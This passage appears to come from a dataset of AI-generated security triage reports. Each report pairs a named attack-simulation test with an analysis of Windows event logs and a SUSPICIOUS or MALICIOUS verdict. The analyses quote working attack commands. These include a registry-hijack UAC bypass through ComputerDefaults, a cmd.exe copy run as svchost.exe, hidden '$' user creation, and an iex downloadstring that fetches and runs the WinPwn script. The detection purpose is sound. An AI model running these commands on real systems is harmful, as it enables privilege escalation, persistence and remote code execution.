     - Frequent consecutive execution of these processes within a second suggests a script or automated task is involved. However, this does not by itself indicate malicious behavior unless tied with other suspicious activities.
   
   - **Execution of `whoami.exe` and `hostname.exe`:**
     - These are commonly used to gather system and user information. While legitimate, their use could be part of a script or by an unauthorized user to gather reconnaissance information.
   
   - **Registry Modifications via `cmd.exe`:**
     - Observance of commands altering registry settings, such as `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`.
     - These alterations might be used to modify system behavior, potentially for privilege escalation or persistence, especially if executed without proper authorization.

2. **System and Security Logs:**
   - **Time Changes:**
     - There are time adjustments, which are typically normal as the system synchronizes with time servers. Nothing inherently suspicious is present regarding time changes.
   
3. **Application Logs:**
   - **Edge Update Processes:**
     - The logs show routine executions related to Microsoft Edge updates. This is normal behavior for system maintenance and application updates.

4. **Potentially Suspicious Activities:**
   - **Registry Modifications:**
     - It's unusual to see a user-initiated process repeatedly modify registry entries within a brief time, represented by chained `cmd.exe` and `reg.exe` calls. This behavior should be verified against expected administrative scripts.
   - **Absence of PowerShell Logging:**
     - Lack of PowerShell events can either suggest no activity or point to potential clearing; this would need corroborative logs to confirm.

### Assessment:

- **Benign Activities:** The execution of Microsoft Edge processes is typical maintenance and update activities. Processes like `conhost.exe` and `hostname.exe` run generally in a Windows environment.
- **Suspicious Activities:** The frequent execution pattern of `wevtutil.exe` and the registry modification commands using `cmd.exe` warrants further investigation. While these activities alone aren't definitive proof of malicious intent, they could be indicative of a script or unauthorized automation/administrative activity on the host.

### Resolution:

- **SUSPICIOUS**

### Guidance:

1. **Further Investigation:**
   - Review scheduled tasks or deployed scripts that might correspond to these activities.
   - Check user authorization and the context in which registry changes were made.
   - Investigate the `admin_test` account activities to ensure actions are consistent with routine administrative duties.

2. **Security Enhancements:**
   - Ensure comprehensive logging to monitor potential misuse/abuse (e.g., PowerShell scripting logs).
   - Implement alerts for significant registry changes that deviate from baseline expectations.
  
Continuing to monitor the system’s behavior and comparing it against a baseline of normal activities is crucial for determining intent and severity."
cacls - Grant permission to specified user or group recursively,"**Detailed Analysis of the Log Entries:**

**1. Security Log:**
- The entries with EventID 4616 indicate changes to the system time. This is a legitimate operation often associated with the execution of the Windows Time service (W32Time), but frequent and unexplained changes could be indicative of time-based evasion tactics by malware. Given the short duration between the `PreviousTime` and `NewTime`, and that changes are minute-level, this appears to be typical automatic time adjustments reflecting system synchronization.

**2. Application Log:**
- The entries related to the Software Protection Platform (SPP) Service with EventIDs 16384 and 903 don't suggest malicious activities. SPP logs are typically generated by license compliance checks and key validation tasks. No anomalies noted here.

**3. System Log:**
- A majority of the log entries are related to time synchronization and adjustments. These entries are common and typically benign unless abused by advanced threats, but no other correlating suspicious behavior was detected surrounding these time changes.

**4. Sysmon Log:**
- Several entries capture the execution of command-line processes such as `cmd.exe`, `conhost.exe`, and `wevtutil.exe`. While `cmd.exe` executions with ICACLS are generally concerning because they can alter access control permissions (`/grant Everyone:F` provides full access to everyone, which is a security risk), this action alone in isolation without other anomalies can't definitively label it as malicious. However, it is suspicious and warrants further investigation.
- The presence of processes such as `wevtutil.exe` can sometimes indicate an attempt to clear or tamper with event logs, but this doesn't automatically imply malicious intent without additional context or evidence of tampering, alteration, or deletion of logs.
- Usage of `HOSTNAME.EXE`, `whoami.exe`, and other legitimate tools can be part of environment profiling post-compromise, but these processes had no harmful command-line actions and thus remain ordinary in isolation.

**5. Windows PowerShell Log:**
- There are no PowerShell logs provided, which makes it difficult to assess the potential use of PowerShell, a common vector for script-based malware.

**Overall Assessment:**
- **SUSPICIOUS:** The use of `cmd.exe` to modify permissions for all users to a specific directory, along with other administrative tool executions like `whoami.exe` and `evtutil.exe`, raises concerns about potential misuse for privilege escalation or to obfuscate actions on the system. This behavior should be considered suspicious until verified as legitimate administrative tasks. Further context is required to definitively determine intent, such as user role validation for expected activity or additional monitoring for subsequent malicious activities.

**Recommendations:**
- **Further Investigation:** Review configurations and context for the `admin_test` user actions at those timestamps. Verify if these actions align with legitimate tasks for this user role.
- **Log Review and Monitoring:** Continue enhancing event log monitoring, particularly focusing on the execution of command-line utilities and processes that modify system states or permissions.
- **Incident Response:** If further investigation reveals no legitimate use-case, conduct an incident response to verify system integrity and verify that no unauthorized access or data exposure occurred.

Proceed to collect more context around these behaviors to determine their legitimacy or root out potential threats."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"Upon reviewing the provided event logs from the Windows host, I identified some potentially suspicious activities:

### PowerShell Activity
- There are multiple entries indicating PowerShell activities with complex command-line arguments. The primary concern arises from the execution of a script located in the user's temporary directory:
  - `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`
  - This script seems to be running tests on the installation and uninstallation processes via `InstallUtil.exe`. 

### InstallUtil.exe Usage
- The usage of `InstallUtil.exe` in conjunction with PowerShell is notable because this is a known technique used by attackers to execute code by abusing installation utilities. It appears the PowerShell script is attempting to run an uninstall operation on `data.004.dll`, indicating potential execution of a payload through this DLL.

### Sysmon Logs
- The logs show processes like `wevtutil.exe`, `csc.exe`, and `cvtres.exe` running in a manner that suggests activity commonly associated with logging, event modification, and assembly compilation or conversion, respectively. The chaining of these specific processes can be indicative of malicious preparation or cleanup activities.
- The `ProcessGuid` and multiple process IDs for Edge Update processes (`MicrosoftEdgeUpdate.exe`) suggest that either it is updating or being manipulated anomalously. However, without further context, this remains inconclusive.

### Contextual Analysis
- User ""SERVER002\admin_test"" is consistently involved in these operations, hinting at possible abuse of privileges if this user does not commonly perform such tasks.
- Entropy can often be a sign this activity was automated or scripted, possibly by a threat actor.

### Risk Assessment
1. **Indicators of Abuse:**
   - Unusual PowerShell activity attempting complex operations.
   - Known tool abuse (`InstallUtil.exe`) possibly for unintended code execution.

2. **Risk:**
   - Potential privilege abuse if the user ""admin_test"" is not expected to run such scripts.
   - Execution of unverified or potentially malicious scripts.

### Resolution
**SUSPICIOUS**

### Recommendations to Proceed:
- Investigate the user ""admin_test"" to ascertain if such activities align with their job responsibilities or if their credentials have been potentially compromised.
- Review policies on PowerShell scripting and execution of administration utilities like `InstallUtil.exe`.
- Conduct a thorough file integrity check, especially on the script `InstallUtilTestHarness.ps1` and `data.004.dll` for signs of tampering or malicious code.
- Monitor for any persistent or lateral movement indicating further compromise.

Consider performing a full incident response evaluation if any further evidence supports malicious intentions or effects on the system integrity or confidentiality."
Register-CimProvider - Execute evil dll,"### Detailed Analysis:

The provided logs display a series of events on a Windows machine, specifically focusing on process creations and terminations captured by Sysmon. Here is a detailed assessment based on the Sysmon log data available:

1. **PowerShell Activity**:
   - An instance of `powershell.exe` was executed by user `admin_test`. There is no indication of the command-line arguments used or any scripts being executed which normally could indicate malicious activity. However, as PowerShell can be used for benign administrative tasks, without additional context, this activity cannot immediately be flagged as suspicious or malicious.

2. **Wevtutil Executions**:
   - We observe multiple executions of `wevtutil.exe`, a command-line utility that manages event logs. The `wevtutil` commands appear to be interspersed between `conhost.exe` executions, all run by the `admin_test` user. The repeated execution of `wevtutil` could be an attempt to clear event logs, often a tactic used to cover tracks after malicious actions.

3. **Miscellaneous Executable**:
   - `hostname.exe` and `whoami.exe` appear in the logs but are common utilities on Windows systems for network configuration and user identity verification, respectively. These alone are not typically malicious unless being used in a suspicious sequence or context.

4. **Command Line Execution**:
   - The `cmd.exe` process executed a command that involves `Register-CimProvider.exe` with a DLL path in a temp directory: `C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\Win32\\data.dll""`.
   - This command could indicate the registration of a CIM (Common Information Model) provider which could be legitimate or potentially malicious if unauthorized or unexpected. The invocation of such commands on DLLs within a temp directory usually merits further investigation.

5. **Edge Update**:
   - The logs show numerous instances of `MicrosoftEdgeUpdate.exe` and related processes executing under `NT AUTHORITY\\SYSTEM` context. This is expected behavior during update checks and installations, illustrating benign and routine software maintenance activities.

6. **Windows Defender Status**:
   - Windows Defender is recorded as ""SECURITY_PRODUCT_STATE_ON"", indicating it is active during these operations.

### Assessment:

Considering the sequence and nature of events:

- **Multiple `wevtutil.exe` executions** could potentially signal an attempt to clear event logs, which is a commonly used technique in malicious operations to remove traces. The correlation of PowerShell usage and invocation of `wevtutil.exe` is often considered suspicious when evaluating potential threats.
- **Execution of `Register-CimProvider.exe` with a DLL from a temporary directory** may indicate attempts to load potentially unauthorized or malicious code into the system.

Given these observations, the activities within the logs suggest behavior that could be linked to unauthorized or malicious intent, particularly focusing on log management and suspicious command execution pathways.

### Resolution:
- **SUSPICIOUS**

Further investigation is recommended especially on:
- Detailed examination of command-line arguments used in PowerShell and cmd.exe commands.
- Verify the authenticity and necessity of the `Register-CimProvider.exe` activity.
- Check the integrity and source of active DLLs, especially those in temporary directories.
- Perform a thorough review of event logs around the `wevtutil.exe` activity periods to identify any traces of substantial configurations or unauthorized changes."
Abusing MyComputer Disk Cleanup Path for Persistence,"Upon reviewing the provided Windows event logs, I have identified several points of interest that warrant further examination:

1. **Registry Modification**: An instance of `cmd.exe` executed a command to add an entry in the Windows registry under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath` with `notepad.exe`. Although modifying registry keys is not inherently malicious activity, the nature and context of registry changes can indicate elevated privileges or persistence techniques commonly used in some attacks.

2. **Use of Sysinternal Tools**: Administrative actions using tools such as `whoami.exe`, `wevtutil.exe`, and `cmd.exe` were frequent. While these are legitimate administrative tools, their sudden or excessive use may indicate either troubleshooting or potentially malicious activity.

3. **Network and Microsoft Account Access Attempts**: Several failed attempts were made to access Microsoft services with a user account `02txoixylodcstop`. The frequency of these attempts within a short timeframe can be indicative of unauthorized access attempts or credential stuffing.

4. **Scheduled Task and Service Manipulation**: Multiple instances of `sc.exe` (Service Control), `taskhostw.exe`, and `wsmprovhost.exe` ran on the host. These tools are often used in automation and service management but can be misused by threat actors for lateral movement or establishing persistence.

5. **Privileged Account Actions**: A process 'taskhostw.exe' listed user accounts including the administrator account. Event ID 4672 indicates special privileges were assigned, hinting at potential privilege escalation tactics.

Given the evidence from the event logs, there is a blend of routine system tasks and activities that could potentially indicate malicious intent, such as unauthorized access attempts, credential enumeration, and privilege escalations.

**Assessment**:
- **SUSPICIOUS** - While there is no direct evidence of malicious activity, the observed behavior, particularly the registry modification, attempts to access external accounts, and privilege change events, raises concerns that should be investigated further.

**Guidance and Next Steps**:
- **Forensic Analysis**: Conduct a deeper forensic analysis to determine the origin and intent of registry changes and analyze the context of `cmd.exe` and `wevtutil.exe` usage.
- **Network Monitoring**: Examine network logs corresponding to timestamps of failed Microsoft account access for any unusual data flow or endpoint communications.
- **Account and Access Review**: Review user login activities, especially around the time logs were generated, to detect access from unusual locations or devices.
- **System Integrity and Configuration Check**: Validate any unexpected registry entries and service configurations to ensure they align with known baselines.
- **Alert and Track**: Set alerts for any further registry manipulation, privilege escalations, and external access attempts for improved monitoring and response."
Disable Windows Remote Desktop Protocol,"### Detailed Analysis of Logs:

1. **Application Logs:**
   - The entries captured under ""edgeupdate"" indicate regular service stop events. The ""Microsoft-Windows-Security-SPP"" log entry shows a standard timestamp and record entry related to the Software Protection Platform Service. Both logs do not reveal any direct signs of suspicious or malicious behavior.

2. **Sysmon Logs:**
   - **Process Execution:**
     - There are multiple instances of standard Windows processes like `whoami.exe`, `conhost.exe`, `cmd.exe`, and `reg.exe`. The presence of `whoami` and `hostname` is usually benign as these commands are typically used for system diagnostic checks.
     - The edge update processes such as `MicrosoftEdgeUpdate.exe` and related components (e.g., `MicrosoftEdgeUpdateSetup_X86`) look normal. These entries indicate an Edge update process in action.
   - **Suspicious Behavior:**
     - One critical observation is the execution of `cmd.exe` with a command-line argument attempting to modify Terminal Server settings: `reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f`. This command disables Remote Desktop Protocol (RDP) connections, and such an action could be considered suspicious.
   - **Privilege and User Context:**
     - Processes like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe` run with `NT AUTHORITY\SYSTEM`, which is standard for system updates but needs consideration if part of unusual patterns.
   
3. **System Logs:**
   - The Kernel-General logs show a typical system timezone change, indicating possible NTP settings adjustment via `time.windows.com`, which is standard behavior when syncing time.

4. **Security Logs:**
   - Time adjustment events with Event ID 4616 show regular system time changes processed by `svchost.exe`.

### Assessment:

The logs majorly depict typical system behavior with Windows and Edge updates, whoami executions, and time synchronization. However, two principal activities stand out:
- The registry modification to disable RDP could be an indicator of suspicious behavior, especially if not in a routine administrative context.
  
### Resolution:

**SUSPICIOUS** - The activity involving the registry change command to disable RDP stands out and warrants further investigation. While the other log entries are benign, the potential impact of disabling RDP could be notable if it wasn't a planned administrative task. Further actions could include:
- Confirming with the system administrator if the registry modification was intended.
- Investigating any user account anomalies or unauthorized access around the timestamp.
- Reviewing the system's security policies and access logs to ensure no unauthorized changes were made."
Headless Browser Accessing Mockbin,"After analyzing the provided logs from various sources on the Windows host, here's a summary of the findings:

1. **Security Logs:**
   - Multiple successful logon events for SYSTEM and LOCAL SERVICE accounts, which are normal for a running Windows system (Event IDs 4624 and 4672).
   - A series of Privilege Use events indicating the assignment of high-level privileges (Event ID 4672). These are related to SYSTEM accounts and appear in the context of logon sessions typical for system processes and services.
   - Events showing enumeration of local group memberships (Event IDs 4798 and 4799) which can be routine in larger environments or triggered by legitimate administrative or system processes.

2. **System Logs:**
   - Standard time synchronization and kernel general events. No unusual time changes or system settings alterations were detected.

3. **Application Logs:**
   - Normal entries related to services such as Windows Update and Edge Update. These activities align with software maintenance tasks typical on a Windows host.

4. **Windows PowerShell Logs:**
   - PowerShell executions which adhere to a restricted policy for specific checks such as querying registry or file system information.
   - Commands executed are usually indicative of a script or administrative task that does not raise immediate flags for malicious behavior.

5. **Sysmon Logs:**
   - A series of process creations linked to Microsoft legitimate processes such as Edge Update, Telemetry (CompatTelRunner), and System Host processes. Observed command lines and process hierarchies suggest routine system update and maintenance operations.
   - Notable PowerShell execution targeting the registry and file content querying which should be monitored but currently align with administrative scripts for auditing or configuration checks.
   - There is an execution of `cmd.exe` to start Chrome in headless mode for accessing a web resource, which is unconventional and should be reviewed. However, there's insufficient context to immediately classify it as malicious without more information.

### Assessment:
- **Suspicious Activity:** The use of `cmd.exe` to start a headless Chrome browser seems out of ordinary, especially if not aligned with known web scraping or automated tasks officially deployed. This needs closer scrutiny.
- **General Behavior:** The majority of events are consistent with typical Windows operating behavior involving system processes, updates, PowerShell executions with restricted policies, and telemetry data handling.

### Conclusion:
- **Resolution:** **SUSPICIOUS**
  - While most logs reveal standard operations, certain activities (e.g., the headless Chrome command) deviate from typical usage and warrant thorough investigation to rule out potential misuse or undiagnosed automation scripts.
  
### Recommendations:
- Review and verify the legitimacy of automated tasks or scripts that might explain the headless browser session.
- Monitor for recurring or similar unexpected command executions.
- Further investigate if any newly installed applications could relate to these activities, ensuring authorization and security compliance.
- Increase logging detail on PowerShell executions to capture commands for improved visibility."
Bypass UAC using ComputerDefaults (PowerShell),"Upon analyzing the provided Windows event logs from the host ""Server002"", several key observations can be made:

1. **Unusual PowerShell Activity:**
   - There are multiple entries in the PowerShell log, specifically involving suspicious modification of registry keys associated with ""ms-settings"" and launching of ""cmd.exe"" via ""ComputerDefaults.exe"". The relevant command is:
     ```powershell
     powershell.exe & {New-Item ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Force
     New-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""DelegateExecute"" -Value """" -Force
     Set-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force
     Start-Process ""C:\\Windows\\System32\\ComputerDefaults.exe""}
     ```
   - This PowerShell script directly manipulates registry to hijack Windows settings and launch a command prompt, a known technique used for privilege escalation.

2. **Sysmon Process Creation Events:**
   - The Sysmon log shows multiple instances where administrative tools like ""wevtutil.exe"" and ""conhost.exe"" are being executed by the user ""admin_test"". This alone might not be suspicious, but coupled with the aforementioned PowerShell activity, it suggests potential preparatory steps for exploitation.

3. **Security and System Logs:**
   - There are successful logon events (EventID: 4624) and special privileges assigned (EventID: 4672) to the SYSTEM account, which are typical. However, these privileges can be leveraged in attacks if combined with other exploits.
   - Time synchronization logs (EventID: 4616) do not indicate any immediate issues but coincide with active times during the system anomaly, suggesting attention to past event manipulation.

4. **Application and Edge Update Logs:**
   - The EdgeUpdate service logs indicate regular update behavior and stopping/starting services, which are typical background activities in Windows environments. Similarly, repeated logs about Windows Defender being active appear normal.

**Assessment and Conclusion:**

The presence of a suspicious PowerShell script that modifies system registry to launch a command prompt illicitly, combined with the observed process executions and simultaneous logons with elevated privileges, indicate a cause for concern. This pattern of events is aligned with known techniques for privilege escalation and initial foothold gain by an attacker.

Given these findings, the resolution for this investigation is: **MALICIOUS**. Immediate actions should include:
- Isolating the affected host to prevent potential lateral movement.
- Conducting further forensic analysis to identify any subsequent or preceding compromise activities.
- Reviewing and enhancing endpoint and network security measures, including PowerShell script logging and execution controls.
- Notifying key stakeholders of the identified security risk and collaborating with incident response teams for containment and remediation."
Masquerading - windows exe running as different windows exe,"Upon reviewing the provided event logs from the Windows host, I've identified both benign and suspicious activities. Here's a detailed analysis of the logs:

### System Logs
The system logs reflect activities consistent with regular system updates:
- Windows Update client events (EventIDs 43, 44, and 19) indicate successful installation of a ""Security Intelligence Update for Microsoft Defender Antivirus."" These updates are normal system operations and appear to be benign.

### Sysmon Logs
1. Multiple executions of `C:\Windows\System32\wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. These are typical administrative operations, except their frequent occurrence might warrant a closer look into the context of execution, but by themselves, they do not imply malicious activity.
   
2. **Suspicious PowerShell Command Execution:**
   - There is a critical log (EventID 1) involving PowerShell executing the command:
     ```
     ""powershell.exe"" & {copy \""$env:ComSpec\"" ($env:TEMP + \""\\svchost.exe\""), $mydata_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\\svchost.exe\"")).Id, Stop-Process -ID $mydata_003}
     ```
   - This command is potentially malicious as it involves copying `cmd.exe` (through `$env:ComSpec`) to a temporary file named `svchost.exe`, executing it, and then terminating it. The use of names like `svchost.exe` can be indicative of masquerading and attempts to evade detection. This behavior aligns with known techniques of malware activity to disguise operations.

3. The subsequent process creation of a suspicious executable located in a temporary directory:
   - `C:\Users\ADMIN_~1\AppData\Local\Temp\svchost.exe` with no typical indicators of legitimate installers.
   - Executing `svchost.exe` from this location, especially following a PowerShell copy command, is highly atypical and indicative of potentially malicious activity.

### Security Logs
The security log events (EventID 5379) involve credential access attempts, but the return code `3221226021` typically implies an error (e.g., missing or incorrect credentials). This might indicate failed attempts to perform specific operations requiring credentials, but on their own do not confirm malicious activity.

### Windows PowerShell Logs
The PowerShell logs include the execution context for the suspicious command previously noted in Sysmon logs, further corroborating its execution and warranting investigation.

### Application Logs
The application log indicates Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`), which suggests that some level of active protection was in place at the time.

### Assessment
After examining the provided logs, the significant finding is the unusual and suspicious PowerShell command, suggestive of an attempt to obfuscate the execution of `cmd.exe` as `svchost.exe` in a temporary directory. This activity, along with the presence of the unexpected executable, aligns with common tactics used in malware infections.

### Conclusion
- **Resolution: MALICIOUS**

### Guidance
1. **Immediate Actions:**
   - Isolate the affected system to contain potential malicious activities.
   - Conduct a comprehensive malware scan using up-to-date antivirus tools.
   
2. **Investigation:**
   - Review user account activities and permissions for `SERVER002\admin_test`.
   - Investigate network activities potentially linked to this sequence of events.
   - Analyze any scripts or further PowerShell commands executed around this time.

3. **Remediation:**
   - If any malicious file is confirmed, remove it from the system and perform a full system audit.
   - Strengthen PowerShell execution policies, and closely monitor scripting activities.

Further steps should include a thorough analysis of additional logs, system integrity checks, and possibly restoring the system from a known good backup if any indications of broader compromise are detected."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"Given the logs you've provided, let me summarize and analyze the key events from different event logs: 

1. **Windows PowerShell Logs:**
   - There's repeated evidence of PowerShell being used to execute commands with the `Invoke-CimMethod` to install a package from a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi`. 
   - There is another PowerShell command executed: `Write-Host VBScript executed me!; exit`, run with the `-nop` flag (No Profile), which can be used for obfuscation or to bypass security configurations.

2. **Application Logs:**
   - The `MsiInstaller` logs show the installation of a package from `data.007_VBScript.msi`, which corresponds to the actions noted in the PowerShell log.
   - The installation is indicated to have completed successfully and was executed by a user account.

3. **Sysmon Logs:**
   - The logs show multiple instances of `powershell.exe` being executed, which correlates with the PowerShell logs.
   - Process executions of PowerShell without profiles and with embedded scripts often signify potentially harmful actions, especially when process execution occurs from temporary directories or with VBScript.

4. **General Observations:**
   - Utilize of PowerShell to invoke CIM methods and install from a temporary directory is suspicious, especially when logged with minimal descriptive detail of what package is being installed.
   - Usage of specific PowerShell flags (`-nop`) and ""Write-Host"" in such a manner can sometimes be indicative of evading detection or initial access patterns.
   - The absence of indication of consent or administrative context about this particular session could reflect unauthorized activity.

### Assessment:

- **Threat Level:** Considering these patterns and the details provided, the behavior outlined in these logs can be considered *potentially malicious* given:
  - The execution of PowerShell scripts without profiles and commands indicative of evasion techniques.
  - Installation activities from non-standard temp directories.
  - Use of obscure script content.

### Resolution:

Based on the events and lack of corroborative context on legitimate administrative activities being undertaken, this type of activity should be flagged for deeper investigation due to its nature and method.

**Resolution**: **SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Conduct a forensic analysis of the file `data.007_VBScript.msi` for malicious content.
   - Verify with the system owner or administrator whether they are aware of these actions.
   - Run additional malware detection and endpoint analysis tools to investigate other signs of compromise.

2. **Further Monitoring:**
   - Set up alerts for similar PowerShell command executions across the network.
   - Review user activity logs for `admin_test` and scrutinize any unauthorized accesses or patterns that deviate from the normal.

3. **Prevention:**
   - Educate users on the risk of executing unknown scripts or installing software from non-standard directories.
   - Reinforce security policies to restrict usage of tools like PowerShell to verified scripts and administrators.

This approach ensures addressing the immediate threat while building preventative measures against similar incidents."
UACME Bypass Method 23,"**Analysis of Windows Event Logs:**

The logs in question stem from various sources on a Windows machine, notably the Application log, Security log, System log, Sysmon log, and PowerShell log. While the Security and System logs provided are empty, the Application and Sysmon logs shed more light on the activities occurring on the host. Here are the observations and analysis of these logs:

1. **Application Log:**
   - Events 2386, 2387, and 2388 all confirm that Windows Defender, the built-in security program, is active (SECURITY_PRODUCT_STATE_ON). This is generally expected and benign behavior, indicating that basic security measures are functioning properly on this machine.

2. **Sysmon Log:**
   - **Suspicious Process Execution (EventRecordID: 17993 and 18026):** The execution of `cmd.exe` with a command that references `uacme\\23 Akagi64.exe` is concerning. UACME is a known tool for bypassing User Account Control (UAC) mechanisms, and “Akagi64.exe” is specifically used in UAC bypass attacks. This behavior is particularly probative of privilege escalation or an attempt to execute unauthorized or potentially malicious code.
   - **Frequent `wevtutil.exe` Process Creation:** This utility allows for querying Windows event logs. Multiple instances of it being executed suggest either troubleshooting efforts or attempts to manage or clear event logs, possibly by an actor trying to cover tracks.
   - **Normal System Operations:**
     - There are multiple legitimate system processes such as `MicrosoftEdgeUpdate.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `wermgr.exe`. These processes run under the legitimate `NT AUTHORITY\SYSTEM` account, appearing as routine system or application updates and problem reporting tasks. The processes related to Microsoft Edge updates seem to align with standard automation.
   - **Other Processes:**
     - Operations involving `taskhostw.exe` and problem reporting tools like `wermgr.exe` running autonomously as a result of normal system activity or minor reporting functions.
   
**Assessment and Resolution:**

Based on the data available, the logs demonstrate both expected system behavior and potential indicators of compromise. The execution of the command line involving UACME and Akagi64.exe leans towards suspicious activity due to its apparent use in bypassing system controls typically exploited in malicious activities. However, without further corroborating evidence of a broader compromise, direct network traffic, or user activity logs illustrating unauthorized access, the determination of activity is constrained in its confidence.

**Final Resolution:**

- **SUSPICIOUS:**
  - The activity involving potential UAC bypass mechanisms necessitates further investigation to confirm if it was part of legitimate testing (by an admin) or indeed a malicious act. Further scrutiny, such as checking the file integrity, source, and the broader context of user activities around these timestamps, is essential to distinguish between benign administrative actions versus a security incident."
Create a Hidden User Called $,"Upon reviewing the provided logs, several observations and analyses can be made to determine the level of suspicious activity present:

1. **Security Log Analysis:**
   - Multiple security log events (4728, 4720, 4722, 4738, 4724, 4732) are related to user account creation, modification, and group membership changes. 
   - Specifically, there is an event where a new user account named '$' was created by the user `admin_test`. The use of such a username is unconventional and could potentially indicate an attempt to obscure the action.
   - The sequence of the events suggests that this account was added to the ""Users"" group, was immediately enabled, and had its password set. The rapid succession of these actions is atypical for legitimate user account creation processes.

2. **Sysmon Log Analysis:**
   - The sysmon logs show various executions of `wevtutil.exe`, `conhost.exe` associated with the user `SERVER002\admin_test`. Frequent execution of `wevtutil.exe` may indicate attempts to clear or manage event logs, which can point to potential log tampering to hide malicious activity.
   - A process involving `cmd.exe` executed a command to add a user with `net user $ file123! /add /active:yes`, which correlates with the suspicious user account creation detected in the security log.
   - Subsequent use of `net.exe` and `net1.exe` reinforces that there were multiple commands being executed to manage user accounts, which is identical in context to the prior security log findings.

3. **Application Log Analysis:**
   - There are no suspicious entries related to application logs that highlight anomalies. The logs are largely populated with routine entries.

**Assessment Summary:**
There are strong indicators of potentially malicious activities:
   - The creation of a user account with an unusual name.
   - The use of system binaries to manipulate account details and possibly clear logs, implying attempts to cover tracks.
   - Actions performed by `admin_test` are irregular for typical administrative functions, especially given the brevity and nature of the commands executed.

Based on the evidence presented in the logs, the resolution would be classified as **MALICIOUS** due to clear indications of unauthorized account creation and potential system misuse.

**Guidance:**
- Immediate corrective actions should be taken to disable the suspicious account (`$`) and review permissions and roles assigned to `admin_test`.
- Conduct a broader forensic investigation to verify if other systems within the network were similarly targeted.
- Review and bolster security policies to prevent unauthorized account creation and modifications.
- Enhance monitoring to capture such activities in real-time to enable faster response in the future."
WinPwn - UAC Bypass DiskCleanup technique,"Based on the analysis of the provided Windows event logs, we can observe both normal system activities and potential indicators of malicious activity. Here is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Windows PowerShell log entries:**
    - The logs indicate a PowerShell command executing a script from an external URL. The script appears to be hosted on GitHub (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). The URL suggests it's a script known for performing system compromises or penetration testing tasks.
    - The use of `iex(new-object net.webclient).downloadstring(...)` command is commonly associated with fileless malware execution, where scripts are remotely fetched and executed in-memory without writing to disk.
    - The presence of `UACBypass -noninteractive -command ""C:\\windows\\system32\\cmd.exe"" -technique DiskCleanup` indicates an attempt to bypass User Account Control, which is a concerning activity aimed at privilege escalation.

2. **Security log entries:**
    - Events with event ID 4616 are associated with system time changes which can sometimes indicate an attacker attempting to cover tracks or confuse event log timestamps.

3. **Sysmon log entries:**
    - The Sysmon logs reflect the execution of several system utilities such as `hostname.exe`, `wevtutil.exe`, `whoami.exe`, etc., usually seen during system reconnaissance or manipulation steps post-compromise.
    - Notably, the logs show several instances of PowerShell execution with elevated privileges (high integrity level). Actions taken by PowerShell in this context match known malicious usage patterns.

### Assessment of Malicious Activity:
- The detected PowerShell command execution, especially downloading and executing content from a potentially malicious GitHub repository, in combination with UAC bypassing techniques, suggests malicious intent.
- Combination of system reconnaissance commands along with PowerShell script execution strongly suggests a compromise or attempted compromise.
  
### Resolution:
- **MALICIOUS** - The logs contain sufficient evidence to indicate malicious activity, including attempts to download and execute potentially harmful PowerShell scripts from the internet and attempted privilege escalation.

### Guidance on How to Proceed:
1. **Immediate Incident Response:**
   - Isolate the affected system to prevent further spread or damage.
   - Capture a memory dump and disk image of the affected system for forensic analysis.
   - Terminate any suspicious processes, particularly those related to PowerShell, to halt ongoing malicious activities.

2. **Prevention and Remediation:**
   - Conduct a full security audit of the network to identify any other systems that may have been compromised.
   - Review and audit PowerShell logging configurations; ensure all script block logging and constrained language modes are enabled.
   - Implement strict endpoint protection measures, including ensuring that all systems are updated with the latest security patches.
   - Strengthen user privilege management to prevent unauthorized use of administrative rights.

3. **Investigation:**
   - Analyze collected forensic data for further indicators of compromise and additional persistence mechanisms.
   - Correlate activities across other logs and alerts to substantiate the scope of the breach and identify potential command and control channels."
Copy and Modify Mailbox Data on Windows,"Upon reviewing the collection of provided Windows event logs, I've identified the following observations:

1. **Application Log**:
   - The Application log records a benign entry related to the Microsoft Software Protection Platform Service. There are no indications of malicious activity or anomalies here.

2. **Windows PowerShell Log**:
   - Multiple PowerShell events indicate a script executed via `powershell.exe` that involves file manipulations within the user’s AppData directory. The executed commands:
     - Create a new directory (`copy`) in `C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\`.
     - Copy all files, excluding the new directory `copy`, from `C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\` to the newly created `copy` directory.
     - Modify copied files by appending text to them.
   - This activity is suspicious due to its potential use in data exfiltration or unauthorized data modification. The script might be used to tamper with files for further exploitation.

3. **Security Log**:
   - Two events (EventID 4616) are noted, which are related to the system time change. These do not seem immediately suspicious, but it is crucial to understand the context of why system time adjustments are being made, especially if done by unauthorized users or under strange circumstances.

4. **Sysmon Log**:
   - Sysmon logs detail numerous executions of legitimate system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) by user `SERVER002\admin_test`. These events seem routine, although frequent invocations in such a short period (without a clear administrative task context) could warrant further scrutiny.
   - The execution of `powershell.exe` complements similar behavior observed in the PowerShell event log.

5. **System Log**:
